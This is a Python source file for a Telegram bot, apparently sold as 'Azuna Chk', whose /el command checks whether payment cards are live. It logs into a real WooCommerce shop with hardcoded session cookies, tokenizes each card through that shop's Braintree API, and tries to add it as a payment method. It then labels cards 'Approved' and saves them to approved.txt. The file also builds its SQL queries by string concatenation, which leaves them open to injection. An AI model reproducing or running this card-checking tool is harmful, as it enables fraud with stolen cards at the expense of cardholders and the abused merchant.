import json
import requests
import time
import asyncio
import re
import colored 
from asyncio import sleep
import os
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 
import names
import aiohttp
import codecs
import base64
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
import random
from bs4 import BeautifulSoup
from user import*

# Establece los detalles de la conexión


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["el"], ["/", "."]))
async def ch(_, message: Message):

            username = message.from_user.username
            chat_id = message.chat.id
            user_id = (
        message.from_user.id
    )

            
# Obtener información del grupo
            queryGroups = "SELECT * FROM `groups` WHERE id=" + str(chat_id)
            cursorGroups = db.cursor()
            cursorGroups.execute(queryGroups)
            resultGroups = cursorGroups.fetchall()

# Obtener información del usuario
            queryUsers = "SELECT * FROM users WHERE user_id='" + str(user_id) + "'"
            cursorUsers = db.cursor()
            cursorUsers.execute(queryUsers)
            resultUsers = cursorUsers.fetchall()

            isPremium = False

# Verificar si el usuario es premium en la tabla "users" solo si no es premium en la tabla "groups"
            

            row = None  # Asignar un valor por defecto

            if not isPremium and len(resultUsers) > 0:
                row = resultUsers[0]
            if row and row[2] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True
            
            # ...
            
            if len(resultGroups) > 0:
                row = resultGroups[0]
            if row and row[3] == 'premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True

            

# Verificar si el bot se está utilizando en un grupo
            isGroupChat = message.chat.type == 'group'

            if not isPremium:
             message_text = "Para usar el bot"
    
             if isGroupChat:
              message_text += " en este grupo, debes comprar Azunachk. Por favor, ponte en contacto con los vendedores para obtener más información."
             else:
              message_text += ", debes comprar Azunachk. Por favor, ponte en contacto con los vendedores para obtener más información."
    
             await message.reply_text(f"<i>{message_text}</i>")
             return
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━
<i>♻️ Comando</i> <i>/el</i>
<i>🔰 Formato:</i> <code>cc|mm|yy|cvv</code>
<i>➤ Gateway:</i> <code>Braintree</code>
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return  
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

# ...

# Al final del procesamiento de mensajes, marcar al usuario como no antispam


                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
            reply = await message.reply_text("<b>Cargando proceso...</b>")        
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            tiempo_inicio = time.perf_counter()
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Braintree</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]....■■□□□□□□□□ →20%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Braintree</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")


   
    #-----------------------------------------------------------------------------------------------
           
                        
            cookies = {
                'PHPSESSID': 'sg8vejsqe9dg2hkod631oasn2i',
                '_gid': 'GA1.2.1517854517.1690714701',
                '_ga': 'GA1.1.431756374.1690714701',
                'wordpress_logged_in_6df0c8871ecce38368eaa7b73ab92b24': 'netyvpp5654%7C1691924557%7CUcUaJWdC6CJXpCYflU1UZMskoEcOLyy137Dmf8tUmst%7Cc1a50ff762511357e6536bb5206eeda4fdf862da3ee161ead223ce8fd4a9b3f7',
                'mywishlist_email': 'netyvpp5654%40exelica.com',
                '_ga_LVBH72100H': 'GS1.1.1690714701.1.1.1690714958.0.0.0',
            }
    
            headers = {
                'authority': 'www.accurategelpacks.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                # 'cookie': 'PHPSESSID=sg8vejsqe9dg2hkod631oasn2i; _gid=GA1.2.1517854517.1690714701; _ga=GA1.1.431756374.1690714701; wordpress_logged_in_6df0c8871ecce38368eaa7b73ab92b24=netyvpp5654%7C1691924557%7CUcUaJWdC6CJXpCYflU1UZMskoEcOLyy137Dmf8tUmst%7Cc1a50ff762511357e6536bb5206eeda4fdf862da3ee161ead223ce8fd4a9b3f7; mywishlist_email=netyvpp5654%40exelica.com; _ga_LVBH72100H=GS1.1.1690714701.1.1.1690714958.0.0.0',
                'referer': 'https://www.accurategelpacks.com/my-account/payment-methods/',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
            }
    
            async with aiohttp.ClientSession() as session:
                    async with session.get('https://www.accurategelpacks.com/my-account/add-payment-method/', cookies=cookies, headers=headers, ssl=False) as resp3:
                        response = await resp3.text()
                        await session.close()
                        noncewoo2 = (BeautifulSoup(response , 'html.parser')).find("input", {"name": "woocommerce-add-payment-method-nonce"})["value"]
                        bearer = (response.split('var wc_braintree_client_token = ["')[1]).split('"];')[0]
                        bearer = json.loads(base64.b64decode(bearer))
                        bearer = bearer['authorizationFingerprint']
                        
                        print(bearer)
                        print(noncewoo2)
                        
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': f'Bearer {bearer}',
                'Braintree-Version': '2018-05-10',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://assets.braintreegateway.com',
                'Referer': 'https://assets.braintreegateway.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }
    
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': f'{random.randint(100,999)}eb255a35-1301-4618-8a2b-0cee852af83d{random.randint(1000,9999)}',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'billingAddress': {
                                'postalCode': '10080',
                                'streetAddress': 'Streeet 484848 péne eoene',
                            },
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
    
            async with aiohttp.ClientSession() as session:
                    async with session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, ssl=False) as resp4:
                        
                        response = await resp4.json()
                        await session.close()
                        token = response['data']['tokenizeCreditCard']['token'] 
                        
            headers = {
                'authority': 'www.accurategelpacks.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'PHPSESSID=sg8vejsqe9dg2hkod631oasn2i; _gid=GA1.2.1517854517.1690714701; _ga=GA1.1.431756374.1690714701; wordpress_logged_in_6df0c8871ecce38368eaa7b73ab92b24=netyvpp5654%7C1691924557%7CUcUaJWdC6CJXpCYflU1UZMskoEcOLyy137Dmf8tUmst%7Cc1a50ff762511357e6536bb5206eeda4fdf862da3ee161ead223ce8fd4a9b3f7; mywishlist_email=netyvpp5654%40exelica.com; _ga_LVBH72100H=GS1.1.1690714701.1.1.1690714958.0.0.0',
                'origin': 'https://www.accurategelpacks.com',
                'referer': 'https://www.accurategelpacks.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
            }
    
            data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': token,
                'braintree_cc_device_data': '{"device_session_id":"8557579c9fc557ebcf68ca5e0e3b41e4","fraud_merchant_id":null,"correlation_id":"710f77d022a9a42f5df2bc95d7941863"}',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/n2fdp2g4g72rc8ng/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/n2fdp2g4g72rc8ng"},"merchantId":"n2fdp2g4g72rc8ng","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Accurate Manufacturing, Inc.","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTA4MDE3NTYsImp0aSI6ImFjZmNhNmMyLTY3ZDktNGYzZC1iM2I2LTY2NTZhZGNkMzdmOSIsInN1YiI6Im4yZmRwMmc0ZzcycmM4bmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im4yZmRwMmc0ZzcycmM4bmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.nje3rzB9kBFRyw51oRIYD36QJXtGh9J624Gr8InrEnU6KrPYRrgh-NMnYmadOxEcZ2oYq1YouKNKHmxFEVenqA","paypalClientId":"AcjUyGIqPHs5IVpYfyJaOPzutHiNXM_mj_izSmL3rM-0wjMv3nRvoHhH1mnYm2M9aAfAjS3cSBGiIZfT","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Accurate Manufacturing, Inc.","clientId":"AcjUyGIqPHs5IVpYfyJaOPzutHiNXM_mj_izSmL3rM-0wjMv3nRvoHhH1mnYm2M9aAfAjS3cSBGiIZfT","privacyUrl":"http://accurategelpacks.com/policy","userAgreementUrl":"http://accurategelpacks.com/terms","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"accuratemanufacturinginc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
                'woocommerce-add-payment-method-nonce': noncewoo2,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
    
            async with aiohttp.ClientSession() as session:
                    async with session.post(
                'https://www.accurategelpacks.com/my-account/add-payment-method/',
                cookies=cookies,
                headers=headers,
                data=data, ssl=False
            )as resp5:
                        
                        response = await resp5.text()
                        await session.close()
                        final = time.perf_counter()
                        
                     
                                     
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Braintree</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📿 Canal", url="https://t.me/AzunaChkLinks"),
               
            ]
        ]
    )
            if (int(response.find('Payment method successfully added')) > 0) or  (int(response.find('1000 Approved')) > 0):
                        print("Approved", "(1000) Approved")
                        msg = "Approved! ✅ "
                        respuesta = "(1000) Approved"
                        with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
            elif (int(response.find('Status code 2001: Insufficient Funds')) > 0) or (int(response.find('Status code avs: Gateway Rejected: avs')) > 0):
                for i in response.split("\n"):
                    if 'There was an error saving your payment method' in i:
                        Message = i.replace(f'There was an error saving your payment method. Reason: ',"").replace(" </li>","")
                print("Approved", Message)
                msg = "Approved! ✅ "
                respuesta = Message
                with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                        cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                        cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
            elif int(response.find('Status code risk_threshold:')) > 0 :
                print("Gateway Rejected: CHANGE BIN")
            elif int(response.find('There was an error saving your payment method')) > 0 :
                        for i in response.split("\n"):
                            if 'There was an error saving your payment method' in i:
                                
                                Message = i.replace(f'There was an error saving your payment method. Reason: ',"").replace(" </li>","")
                       
                        print(Message)
                        msg = "Declined! ❌"
                        respuesta = Message
                        if "Card Issuer Declined CVV" in respuesta:
                            with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
                            
                            antispam_users[message.from_user.id] = False
                            return await reply.edit_text(f"""   
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Card Issuer Declined CVV</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
                        elif "CVV." in respuesta:
                                        with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                            cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                            cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
                                        antispam_users[message.from_user.id] = False
                                        return await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Gateway Rejected: CVV</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
                        elif "Insufficient Funds" in respuesta:
                                        with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                            cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                            cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
                                        antispam_users[message.from_user.id] = False
                                        return await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Insufficient Funds</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
                        elif "AVS." in respuesta: 
                         antispam_users[message.from_user.id] = False
                         return await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Gateway Rejected: AVS</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
                        elif "AVS and CVV" in respuesta:
                                        with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                            cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                            cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
                                        antispam_users[message.from_user.id] = False
                                        return await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Gateway Rejected: AVS and CVV</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
                                   
                        else :
                             msg ="Declined! ❌ "
                             respuesta = Message
                                   
                            
                                    
                            
            else :
               msg ="Declined! ❌ "
               respuesta = "Ha ocurrido un error inesperado."
                    
            await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>{msg}</b> 
<i>Message ➤</i><code> {respuesta}</code>
<i>Gateway ➤</i> braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard) 
            

            
            